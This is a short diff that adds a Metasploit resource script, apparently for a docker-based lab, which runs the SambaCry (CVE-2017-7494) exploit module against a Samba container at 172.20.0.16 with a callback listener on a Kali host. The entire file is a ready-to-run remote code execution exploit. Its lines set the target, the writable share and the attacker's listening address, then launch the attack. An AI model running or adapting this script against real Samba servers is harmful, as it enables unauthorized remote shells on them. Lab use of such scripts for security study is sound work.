@@ -1,0 +1,12 @@
+# SambaCry CVE-2017-7494 - One-shot exploit
+# Run: msfconsole -q -r ~/.msf4/scripts/pwn-sambacry.rc
+#
+# Prerequisites:
+#   - samba container running (docker compose up -d samba)
+#   - Kali on 172.20.0.5
+
+use exploit/linux/samba/is_known_pipename
+set RHOSTS 172.20.0.16
+set SMB_SHARE_NAME data
+set LHOST 172.20.0.5
+exploit
